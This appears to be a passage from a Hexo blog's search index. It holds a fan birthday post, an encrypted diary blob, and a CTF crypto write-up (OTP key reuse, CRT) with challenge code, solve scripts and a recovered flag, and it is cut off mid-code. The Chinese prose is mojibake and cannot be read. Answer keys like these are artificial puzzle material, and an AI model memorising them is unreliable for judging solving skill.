<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>12.3 KasakiNozomi&#39;s Birthday!</title>
    <url>/2023/12/02/12-3-KasakiNozomi-s-Birthday/</url>
    <content><![CDATA[<p><strong>ä»Šå¤©æ˜¯ä¼å“¥å“¥çš„ç”Ÿæ—¥å•Šï¼</strong></p>
<span id="more"></span>
<p><img src="https://s2.loli.net/2023/12/03/uknXZsdHrz42wPN.jpg" alt="3092507-20230224232909457-349401112.jpg"></p>
<p>æˆ‘æœ€æœ€æœ€æœ€æœ€æœ€æœ€å–œæ¬¢çš„è§’è‰²å•Šï¼ï¼ï¼<br>æ„Ÿè°¢äº¬é˜¿å°¼ æ„Ÿè°¢äº¬å¹ æ„Ÿè°¢åˆ©å…¹ä¸é’é¸Ÿ~<br>è¿™ä¹Ÿå·®ä¸å¤šæ˜¯å…¥å‘äºŒæ¬¡å…ƒä¸€å¹´å§~ è¿™ä¸€å¹´æ¥ä¹Ÿæ”¹å˜äº†è®¸è®¸å¤šå¤š~<br>å€Ÿéœ™çš„è¯å§~<br>å–œæ¬¢å¸Œç¾çš„ç¬‘å£°        å–œæ¬¢å¸Œç¾çš„ä¸€è¨€ä¸€è¯­<br>å–œæ¬¢å¸Œç¾çš„è„šæ­¥å£°      å–œæ¬¢å¸Œç¾çš„å¤´å‘<br>å–œæ¬¢â€¦â€¦<br>å¸Œç¾çš„ä¸€åˆ‡~<br>ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚ğŸ‚</p>
]]></content>
  </entry>
  <entry>
    <title>2023 - 12 - Diary~</title>
    <url>/2023/12/03/2023-12-Diary/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="9c8c0204aeafedce701bbddb8d5e3fc45d6b69ecb4bef653d80acee162a9ae44">84ddd93a2d570b3707d5ad36f450649bd9089ff895aa022e66c86996c1b8d12f26a776805ca63152fc06b8f8245079bb338a7a943efc7fdd92f3bc6a120d5b9f4bcfbf7e4f4a50dbe29e6c7de56d1c471680fe22143b75feeed6216317535a680b76be7d22f6a670a4e4e2afc97b3b74530fd2abe982b3faf2281601a62ac07f28f2cc8f9ea94e99b5c41ecb8b2e72900dfa68f63f8a587387d77e50cc18da47246b03d27332279b3bede1beef93d058b07a8513ae12ab397e909db7febec92aea3929e435cb5334ec34df806d1d309cf1e080769002d39984be475e7ec063d53b88bf16a22172958cdcf2bf19ac9a28d388bdb014db2be9dbe551b08a07db8c69daabd8d36b08b2e95e481e19e9519dc51b3849de6d3999af534e55dee82624b66b806c9deaa603642ba8735da648cfdffb625720a758c3e35e120078c9589b1804f0de89b23ef8ee64f671c4ee3078b05fcea49dca9ed5b3415df1d663342263d5c05efb2c850365903d3ab557fbd4068c78fd0219f10aaafb764666e1d635efbaae3c407711fcac02ab94c0484907a11656c54f3f351aa5c4fd116ffe5b062181a18457d02740a0192b9a21ea4f444a9c0aece7b28b955613f3074bf99d3eab4150ab3b1d661cfe993434116f043e6cca7f73144cdd8ac3c2206400a72121149e201524a12c91105d88efca512dd19f94d81fcaac89105d73894d835d8427d9b2463b53c5b7d80475172be8cbfcdfc9e975c03da4accd2549c125725b5fb5f379e3660937200c0c1ec915dfe49cf93675bf8af23ff6886fdb58b78387b55b924f1292f29fb8bd951d077341631e8e7914c0af4afb9d57069c3ef6c6bd414b350fa6ff8f7e818dc5136fa94260a8bbb8b8fdc66f43e52c5af21acd801cc9eb551440423bc0decc153490c9273b54dbd95fcd87f631d740e67c5bddaf6e813aa4b2447dc34004ee21cfe291c8cd43c4be79d6a3c769786ffcf52077ef5655d0411df5d17c5ec58b40ae0085aead7a3e1d9102e19830e953bb9cce6194f677ad8296f41dafca75f33e7e48f05be8a376145d9e192bb24081b45f28c971830852b3fd57283a1fbab1fca66595e26a771441654f1e8e0269e71e8bcc7fc6ef99b21fcdf11abf0ee704f9df73cd871431e308fce0cc52b228fdc903489eb8b869a5541fd9dc417c8ee4f5a4bb5f410afff5d24ceb05d06ee1d8f53d3a89931ce5226c14077ca2ded7f8344d4702b1bc93078573a351fe3b9b0d3862126a20d02ba6391a921b68ab595bb0dca61f24d3cdb268aa772038adc694d2bae317ea2f5f4537cc8da0e9e31ce7fcf0f17c5ed4eb834517db278d6cca0ec3d27c08b8e1c11ff3d69eb4351fafffe6d791e45f6a628930e41cedcbb00a0e2a17572518ffd46dffdb5c73ad0415864a76318eaa516ac37c41f31c8ecb9d18439956dbef61d5ee1a8a7dcbffd768b69048fa3d1a7967cd7b817063109eb21defa7bced37c76b070b72ee6350b446a369367c0f0764683acfbd3d160985c47aa793e8abbbe65618d285e860b72dc6db7c5a11f9d2ef9157ef6445204f276fafd8fa1ccf4661d54ca2c5591c10d49b2ccf91073fede3f7ee697fcc9739fc9461f726ab387ca73fc410fcb44f8173c63da743913ad92ccad9c0b97c21989364c670c3ef00dde556754ee7267601438385b679e7a9fb3b5b62d27ce9dbffeb21c93c77446353efa0e159aa545a061c596115d03cbe4ce076a81f178ade1be0ee2ddc97c15a5d6a96eebf99e17e4b517ec3f69712e0fab308004880f7e0d67797ef5bd13b7d3f5deebf2b5a10b93011655b54aa739bbd8fa7f3b8a03a2415e6232105b9c47c70b27f7ed323f0f707b5b8fc482d85e5647ecd060712c9d0b7aa2dcf813ad91407236d476c35033a42453bad417e064f528ca353b35df63f34810c2af34a37dbbc016d87392e100b697499b1826b2f073b615adedfdba2184477fb21e5439d2cfb2630eb145d40d53de80f206a056893770a87fbb0792125a51d03cbc23a5ce70aa716c455f44cb0e155ee2bd42a4c3f3ba0d95cb3fc0ba1d6086ef24059ed5cbde67f59037785b1e604c473c24b5224dffdc17277c1bf00bacf8d0d1d7c60dbcb6c7a068a4b0881b3b5b6041231a155135e5ef1713637903820a6427bb4cf7dcce8f6a7e2a0796854e00226e53bf0e228e16d0d7bd141566079e4314334a6f463dcddf5ffe92be01cf074425eb47a6db22c272df4e9c6330f378ccb5df062b5c92c8ddb2ea863086e6ca1e266aa8bc371ff642b85e5cb83476f3213ed0c368256592ed5473277b78dfa33bd99eb693cb553bcf05cb5fa95228cb0eef3dd3bc8cd2ab3436ec13014d14aac0078b2c66a0f3a5fc56fe7a51f807a2e67997fe247a3c7b9dfba364bfc5c25ecee851cd907f769c062c131803531ad43368265d4b113d88418d1fc0229d2fbf12ca695cc735c5751636232181136a610a32b53351b3ded8c30d53337a928bbc534de3ec9722f047794dfad62cf5cb7ea1193af75347bea3eb784f994e2524ad17abe9e29c9578cffd5f71764a68aa41be406834b9c5e7b62ee5c809bb98c208332b14dd080a5ff83b5694a0301630cf97825853f142944e9132d8736c0163795aa9e0da00f0f12353f11a11e0f85bbc8d71bc3b738d50592591edadce7c6db19974de5da256f97be4bdec65cc81b2f817597020dbc02f65efb12047cca44799ee3ee8905297ba14a6b7a2718d66ccb01ecc3229d808df4ddf308d7f89e97bbf007b78d818e57a4263ce938b5963d96bd589f6ef10813b3c4c0ae855e2fb60f1b4ef3e38abe3f3c39517d062d76747790d70fdc0d9f9eba9f13ba24f389881360b0e9d3d6a71843ff565a194765f442f58c6c61ed3beb9d1fd51584a4af12731c9ab7de3a0f7e52fe91e959b9536d3fb2eaaef62a697ea60f469ae1d73b0f5a605c2c7925867785e77df04818fa6d2e793b54efcf1a1484b6833b7b4f32987f31c08c6154dc54fd2e3637f984289a9ee24c83811b65ef132e2f2fb0f8a291209349963206ec03f738692b606fa3e2be921c8ce9d06060067d75fd503a6d3459a600886b36a4b86d95caa5000427a62dd90e2fc847122f37cd69b67bef624b94e58023566f4709193ab5caee0cfc9b2a8f6fc6c2bed2a806863b7d39fe5065e292b65e354676754d7aab2a043396d59e971e2500157e0e8705ffe9de3e28e235abaff5691b3cd3132aa6eada4179413526b0b44fad2abe5062a865c332cae2cb4b3da8bf8a2cec738124d393db64267b89383716a84c71178823ea9ea9ce9d29205fcd82eefd4cd24522a0b136ab7e6aef00856e318e80ef896da2eb7337db8c77bf62e726fdf9ef19b3c8e570f1e1dda5cdd358bdfa59ded50222986b0515dcbbd0ded9d38de6994125d84960452d6954b07b51537def7ad1ff7212d38f384b628fa8306829d57668d2c4a21865b9595ad6f337663841f9e6a4b1ee9d5c1b31348d9435a5040271eb1d0cff2af869b25d1bc09fb7e5655f7da7b5f62d4fc4cb7d5613342afa653a26d0c53f1321cb2aa03fe113b952b21bc32c5f8507448a878ae76a1ffb5f338786ce92ba5b229fdcbd75ba58481432425140e1e7fe46955d620dba851370771caa208e9f2c1699f375009988da834fbd3dd4843b7b8cc5d2559c00517872796c003b0c9395f5ab8d4818d6660f04024afc0c5961636718f687b5326673a59332813ee76016d36123c9a2c4a045b7f8ccd3c5dbb37c3458c79bdf1c392389f575b5f3f15ff7fec2c7ed2211e95fc80e7cea0295e75cf8504add0e94afde10f45720cd5112d9fd8fe9a19d04300df42c1f1c702f9624243c7aaac9cdd7a2f778fc4bdd8e85552bc608098138626e14ad4116ceeb259d7ec8854c5477cacf0a67cdf3f61fac83946d6e83a4ae718a4b052a04d4706639183ea7e1648b10afb8f8ca9e03828f2c764a1f3449c7bf559aaf1f6158fafae2cd0050a07da0c5516010ed69d3548fefa9c7c39f2c5ac8e4d33b78f258993f7089ee010a7d3856402731b823215934aa87c88585e856e14baf0b8a3913763723f730d5d9d4509b8fc7d5ac5a18f9f02e24c92fcfa783ad01cd64810db039502e50915dbc1c8166789fa0d711fb50a3fbfa3186ae4c2fb55198b021af94dff675a56b54bc94d8ef85d59147c95d372d0ea71dbb045c7db13bf0e70b9712b53f5818bc0d2393ab5b84674f2e81cfdea7f3066669d27c51cf0cb17ef10bc79296e93e61857ca46a270ac3bc1d54f60bf71f46efacae1b817921aae444855a0776bd76519017f38eb261e9170ef4a2aec0c7bd43bf2f611f3ed0de16526bd7863f0933c6578c95dcb87506943cd05a20bc4fea6a36847aa44193b1cb19b805611393a6c7eba52c34d81fc8dc73e776aa01854f972f5b190acfc2b6d8a06c66f213e423a330e25c26312fc110906ece007986ec42187686ccae5ed868af9e183f19b3e17bd560162404a15e24eecfbe6faf98826a9dca771cc17583328b18014203bfe64a2979e4acab9c50d4a2788e1e9326ae18d423bd8d521772ab27bde8957ee838e24ab1cca2813556d3ef3bd34769c0b2acc90ef1fe76c0ef78b4178362cbbfa7d000648314f3f5e6cb7739ff719c65cd09a93a8c6705b7f0bddfeb8fa0126705b20ce717e58012c3cb1a36f9008f5f77ddaf3c15df09ce8510b160145a2704985590b96f2d2db26a17f45a941ae6da17e0fdce5aa0c2d76400eb73622e92741bd75d7a0a5321917e0cbe5786257b6ce19f1bf1fa442705029c39f987112212c9467b07f1c9fc9d8a53438b756243e4b4f915e6073f44fa3413962f5f5d23944217725dbba5089bd91785a0ada45bcbf2ae86ca7db66b4d5226228b62c2b19115881a5e9e0e88bcdd93489bc56d7f2a416299224ab5d74140e93cae6aef63b4e40d1974d88285ad4ffc2601c12345be3b0dd4120227c483741d1a6f9f01b022ab8cc7e2a4a90ffe22ee8e322b2772c53fc220c186a70597ddfc38d6b4b5f9db3ea4616dfa8e8b283a0631657cbd95766fa41fb4df445e4f3c809d3c5824e3f17968ba23465a5cde0631de6133066c9682dd89860dba77914997fef155a1e347e5c508b17508afada75317301fa9ee17a6340fd8cbba6e64ce154259bd0785d6e56dde8e1c129253a43b4a2c9ecb42881c775cbf3f976f67993b33aed7c544284735a6dfb7043cfa5bdaaa7866cc1068254e42cc3231ffa2ab8fccef095f4027ace31cd5b8972dc1461566f30d8e03c9a8fd48553d4185d01d9f8155ae964197fadd5309ce41f471fb6e78623caefa2054624c10a59af3520425f2abe393865f69e6327cf73b1b67d977e648af72db7c39161488ed142004f66b0b3ec8eb0f5f59e5471b540638e6252484c269fc88b0be56c8deb7de08b049b90722eec800b6adebdc5be4a786481e5941ef90a94281881fcf986f14cc3715364aefcf0c3279f142c5a9a7e7849b6f373d8732f8471dc1d62886cc21b158be6d2b360f9d636c36c48001017bc01dde85f6418e126b595413d4d8cfd1c736cd1f987898e24463f12681033c4508ea1d954d5e7758d7a62474f087bc3c470e9c42d278d5ad26bcd6a0585f3e918c465389beff51eb0d585add6b4a08c58968789d4a091f50493cd3d3e91214f1dfab1f7bafdd0de0bfd841b64af51533d568f4b23d9125821513068f8fbbe4f867841c8c2c848b45634f010565133661f4ee01645c39ec4b289277fbf2c01404f7cc054864793f3ae119a63597881653b63847439f2985d44256a5ada7fc219ba73aaf66e283e2bf00bb7c994f7c3d9b240c590b903af797c8209d213e8d62da31b0347a8e75d65151bc284865de584a0adf2a2072da7960fc22678670e9f5cc38d35421b2459403b648200b05f540384231a3998f8a09708890322d3757c179d725142361e0a239673bfff830914f991c059519f88e6d0a2d5009cf348db03b38fc651e21c590d27be40b2799dde86e0ae31b8688d02bcca6f8e6b3e04c9fb07018a3b671fef591553ab35ced7a1227adb715f948f61558d747941cf201903a1d6b65fd67256cdb0b55e1d41971789f17ecc696272a82cb10e5422d5dd1f4dae86349774b54e013bceecd80c6fb7a498dc4236aba2d1487c531bdc001e651a88b14da17680f6c213d074816ca6e015ee98be7dd3fda99a5a49939287bbdcae88ce66dc757052ffc14200916860b87cfe058d0bca3a75092e96ef98e0eb348e16fb8cb73f312753a9c593a6f5cd984b825ca5953148777d768eb5accd0eb20eeb2991aa3fa45096a7831e2645fe7295b6205567680b04eeabd476517caf46d69511d6115138488128c9d02fdda3d42b8bbeb7b38a4fe1863d2d85620bb225e792456c10ce021643f98371ca934a9a4cb154f5fcd6c2b4d385df66340f98d73316ba34d9d42523ef125b470918f03e5e5460c24c919d66caef796e3f0b310e627760975d68b68afab3692bdc8a555cb8810bd3d84654adfb7c19a656e5977538369b0834eb1730985e4267136fffdc5aada6a8f92cb6e1e3c7486e483edefb18158ea93f7c50196fcffac884f2dc771ada84e52b098da96de50269a5061ff006e52c2543e6309369a76e87f3bfa8a96d483b029d62d73114425adbdf66e09798d0b7ab96e2a4b29d4512c927c28874f0136c566d93383716ceb5c3383fbbe6608816542b5c688c3b8e45f164216620909b975f71ce355faab9ea3036df471357b8c0c3f55a3de25ff300c978c5d1ff060b2f9fff869620442812b82c53c1411be4a9c699ba86058231c3a209771c905336ed297060b4e1d93b5df7af85fe987a1214c812caab4c894fe3df62845fa99621b0862fa23dab9623bcb7ed8535e25b938a344ac5c9a7c2959a38412239c2eb69adae0a638e5473302ddc25c36ca7bb62e2f6e3572b4776d1c5c479acb251aedd11dde1e5e40c371f31180e619738a86d5717afc39c323d226c25a984b7129ec3761affed4786689e2df7d1f2451ffcd403bccf1508b58ba26826a69c7f0b3fc3e1d5e957e8aa2618329d364328f38dc36ee53e7abbf30e0f33a4bcaddc446212667aa5d0a750f53924064c9c191c56de7c46dad4e5fb6b000d8939ec54ba90e340e113679fca06d1f5f2add6876cdbc22eea966ace3170195e11753dde4cd0b7d9e6c2bcb0dccf5ca536bf7e1e48be51f6beb3f7e70b387405849645fcca3c004a484365c5781688e78c8566169ee2ef86fa2653d44fa579b454f35e66e03b13db3967de07c98c90093fd614124ee4fdd0378c8d669d91be796437dce772b542930366d4c58f74a84fdfe25585d1269e7a644dce8a50479443e0defa5cff55373f60d97c3eed8dce5654a0e0eb6a9e20f074bd31355841400ab85ed58f3f3cdb58327a45054d571bd488b399c265e4b5078cc31b5bd633b99deca9194c0313484f4052644aaa3e4d5ed457196c998028a7afa052f24c79f06afd7aded2c15896227e054ab6a5138f0865152ae98aa0615b8537c88e9af672228b5bdaaea1f416e0edb2d11c316d59f458c4e65bae6607638cc22a1bbd305a1bf0cb77d8fbf352b08c32046e480bf1a5167915077b19f10160d041658c223cf6058a9db32e70739a79debb16a278987709e051c13bfd3acdb1684ca1c25aa5b58189bc11d17a723cd3b8604ad981aa48abcaaa7bfbeb0e8dca978f9ee6a96106c1edda2da4f3a428fed8859e957d10e3a47594a0b27cb40b7f8593f4b6f35f50be088e5779edb28a5988b0164e371ebd8983f4a26bf333afc1b611f2f1a789489626d5c63409a9332fbe5a78d03b9d583a232a2d7c08d094fe49bb14ac9f846e4ad9e70711866836759f29929e99fd387cea0160107f4c143fde070a0579462f992663a0fe47f07a29078ef33b326ee6eec284ef3281907d4d294b8e0ce4e6a26d4489028fdf6d9048e4255b661da103abd667468f8d3c78542a7f55278f2afc2b9662ea8ff2136f39291229f3ba9a21ef67e4cb1f9b3fb4546d8bbf2827c31fbc77d42b8a6312ffe04c5a62df0ea24508f05ebec588087a6f7e15b3c32e5a147bf3629548aebd2ce09a6d79d3efb3c476ed23be2048441732d96f5db4546b39b7ac97453daf03e8d66daf88b4ba431a2ea8d6c92e55ce2a0e99c94af3497ebae4057ee754ba17b0c714037e57bcff1b39c3e4ebc5d776696441d9c5da901a5e2f8debe6f0d28de7b86eff9faa7b7b2088a85ba6945ca61c94c3e8e69dc3ff48aca99cefb257885c68960e96fce71952e41a5084b0aa1dc11f3d98ecaa8be7936410030a02a812af60c24ec920075b24497e751c102d56bb8f8d2284f96c8816b5d9d6f5457a7f9ab1bc72f098f6054a51b58d1ea7ae59ded33a1b96bda58a24cfd4940d7b0da1f2a42de47993d35523bcec6496978b4dc9547440aead07c4433308872aed89894fc1f345cc580b44eb95c77085969628983b04cc13161ee16d9c7d631d09ecd51d59ff47c07807faa4b24ea613e4e8f21f48cb300b059c5076bdb7d147788c2669a600aaef306485c5f59a11192519cac20712948844b9d0c6694d6e62de649c66e5cc8ac283fbe39647fb904eeeee6dd5a824c3234f4757079dba8ad3708b2ffafee9cdf10caec8ab7ede03d8fdc5110ca16d762b71c1fe683ed3b7a26feda97eba0dcc2bf8a3eca78b9ba5dbd7c6b68613f83fd57f363d4cfe3c7da8c0203321f03aaec0aada11916650585eaed50a0b4f76a59bbeeffd8d03c83c7a4ffecaefef920356e733bbdc4da76fdcde532916cb64663f8e8902319902bd7d6150042ffcbe553bb97d07adc8b533250999479dad94c506917642e1e41c7d052256649ab09e106d744731a15add907b0cfaa26e5662a9c63b9c3c95655a4f35e99eb2b7b6bbd7af228114e717b65432f640a6eac37d9bf756c8286b084f1feb022f55da72f906984df8d2ddcecde43ae222962a45f0eef368852b85c72261028c15ea7d1479f3ae9c710a8b909a58c925aa65f96c12b94df2e5d3047574e8acd109966620bf509a2e550bd58b079fef568f3264329e032a38eb08d25710f24ad9cb2418a9cfc0658b4d744b2004348b4477afb95e9668864b4f86c6847be9a5d5744d8a9cd6413858244a74ea4d2ae7d18e16cc922a7b20e46509ec44008af29916ab92b49835bca115646755d186550270cbbd6cbfcd34491a24c34a4b58866935260b95a1730a7ee82920a075a82a6ec25ec8496e963782122f6ae675a0e6cf2145b6adbbe17d7554aca1d7905d875e0c2e53122a73ddf8f4b2e05cb5810683f9b8f26b528ef156ae0cf1615afd065ff9c85c2628ff4817d9c94abab199644918aec9074ef85742d5192864093a4ab47bb1752fb05f5d257f5529ebab657d34c5125bf1a82d1c0c0be3c6fabc75d78a6fe6e47ef99bed9490c52bac29d83c59b1d5234d84a1d15f98e01769a0422cc1d8f31c2dbff25a1030cf1c75e9c5c7df17e05807b8475ea07c9d5f1703dbf829405849686709838084f2e976056cd23d893ed3b99c53942ca5ad9a046e8282f43033ef520b35c7d3834a12cc3e23b6300c6e258acdc19ae6ebbd12b38fe3f37d90ed9f719a449e9907f9c0475db5f8e1f06aba0ffa952eecfaf75bea1f996a54ddb44e97511ef16e533069fe409360917a16d5fc4ba2666c6909f198b41f222428380737e833f0466c85328181c0b225c857d2fd92f8806d0d93ff5973989bba37399bd5e9ebc82b99c977f6eb203155906a8e983d780c5ca94e994f73ab7903e553ece5ebd9929da7fd0fb5e9440192ec16f49b4b960d84b315c344d13569716ef76fcce565297f106568f768b9fdfcef6dae0d31f1b4a16421be775b69779af0c4b129a2c38d8a6acff600e7905a67459a7cee934143869e4f911760380a5cfa98b16bf56dd16beabbf81b489314c8e57df0fdcc2845ef879152fa3094616ae372e04cafea3c63dc377b70dd0ce2e2bee0d7553b0d8b947892f32845547679e3a5df1b919d2d1e0</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>2023æå®¢å¤§æŒ‘æˆ˜ Crpyto</title>
    <url>/2023/12/03/2023%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Crpyto/</url>
    <content><![CDATA[<p>æ²¡å‚åŠ æ¯”èµ› è·Ÿç€å…¶ä»–å¸ˆå‚…çš„åšå®¢å¤ç°ä¸€ä¸‹å…¶ä¸­çš„ä¸€äº›é¢˜ç›®</p>
<span id="more"></span>

<h2 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># step0: key generation &amp; distribution</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s0</span>(<span class="params">msg</span>): </span><br><span class="line">    k1,k2 = [urandom(<span class="built_in">len</span>(msg)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">    <span class="keyword">return</span> k1,k2 </span><br><span class="line"></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: Alice encrypt M, and send it to Bob</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: Bob encrypt c1, and send it to Alice </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> c2 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: Alice decrypt c2, and send it to Bob.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s3</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c3 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: Bob decrypt c3, get M.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s4</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg,k1,k2</span>): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">assert</span> msg == m_</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s what hacker Eve got:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_</span>(<span class="params">msg,k1,k2</span>):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">if</span> HACK == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(c1) </span><br><span class="line">        <span class="built_in">print</span>(c2) </span><br><span class="line">        <span class="built_in">print</span>(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line"><span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>emmm çœ‹ç€OTPæˆ‘å°±è®°ä¸‹æ¥äº† â€¦<br>åˆ†æä¸€ä¸‹<br><code>c1 = msg xor k1</code><br><code>c2 = c1 xor k2</code><br><code>c3 = c2 xor k1</code><br>é¢˜ç›®è¿˜è´´å¿ƒåœ°å‘Šè¯‰äº†æˆ‘ä»¬ <code>_m = c3 xor k2 = msg</code><br>ç›´æ¥è§£:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line">c3 = <span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"></span><br><span class="line">k2 = xor(c1,c2)</span><br><span class="line">flag = xor(c3,k2)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># SYC&#123;I_l0v3_Crypt0&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+os.urandom(padlen-<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = pad(flag,<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">p = [getPrime(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)] </span><br><span class="line">c = [bytes_to_long(flag)%i <span class="keyword">for</span> i <span class="keyword">in</span> p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span></span><br><span class="line"><span class="string">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯CRT å°±å½“å¤ä¹ ä¸‹sageç”¨æ³•äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p= [<span class="number">58657</span>, <span class="number">47093</span>, <span class="number">47963</span>, <span class="number">41213</span>, <span class="number">57653</span>, <span class="number">56923</span>, <span class="number">41809</span>, <span class="number">49639</span>, <span class="number">44417</span>, <span class="number">38639</span>, <span class="number">39857</span>, <span class="number">53609</span>, <span class="number">55621</span>, <span class="number">41729</span>, <span class="number">60497</span>, <span class="number">44647</span>, <span class="number">39703</span>, <span class="number">55117</span>, <span class="number">44111</span>, <span class="number">57131</span>, <span class="number">37747</span>, <span class="number">63419</span>, <span class="number">63703</span>, <span class="number">64007</span>, <span class="number">46349</span>, <span class="number">39241</span>, <span class="number">39313</span>, <span class="number">44909</span>, <span class="number">40763</span>, <span class="number">46727</span>, <span class="number">34057</span>, <span class="number">56333</span>]</span><br><span class="line">c= [<span class="number">36086</span>, <span class="number">4005</span>, <span class="number">3350</span>, <span class="number">23179</span>, <span class="number">34246</span>, 